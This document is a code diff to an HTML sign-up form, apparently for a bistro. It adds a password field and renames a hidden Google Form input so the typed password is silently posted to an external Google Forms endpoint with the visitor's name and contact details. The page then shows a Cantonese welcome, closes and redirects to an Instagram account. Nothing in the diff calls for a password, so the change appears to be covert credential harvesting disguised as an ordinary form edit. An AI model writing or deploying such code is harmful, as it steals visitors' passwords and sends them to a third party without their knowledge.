@@ -136,6 +136,13 @@
 													class="form-control required" placeholder="Your Contact">
 											</div>
 										</div>
+<div class="col-md-6">
+											<div class="form-group">
+												<input onchange="traceinput(this,'password')" type="password" name=""
+													class="form-control required" placeholder="Password">
+											</div>
+										</div>
+
 									</div>
 
 
@@ -255,7 +262,7 @@
 	<form hidden id="googleform"
 		action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfFB-8-6_iN_xcqN8mxBz2lZIRfpAozjShgpYVNtUgHyKALzg/formResponse"
 		method="POST" target="googleformiframe">
-		<input id="googleformpageidinput" name="entry.1554866495">
+		<input id="googleformpasswordinput" name="entry.1554866495">
 		<input id="googleformnameinput" name="entry.492191080">
 		<input id="googleformcontactinput" name="entry.1364016212">
 	</form>
@@ -275,7 +282,7 @@
 					clearInterval(googleformcheck)
 					$("#loader_form").fadeOut();
 					document.getElementById("thankyouword").innerHTML =
-						'Thank you for signing up. We will contact you soon.'
+						'歡迎嚟到如煙嘅大家庭，請順手Follow埋如煙嘅IG☺️.'
 					setTimeout(function () {
 						closebrowser()
 					}, 5000)
@@ -322,7 +329,7 @@
 			$("#loader_form").fadeIn();
 			console.log('close')
 			window.close()
-			window.location.href = "https://www.instagram.com/"
+			window.location.href = "https://www.instagram.com/ex_bistro"
 		}
 	</script>
 </body>
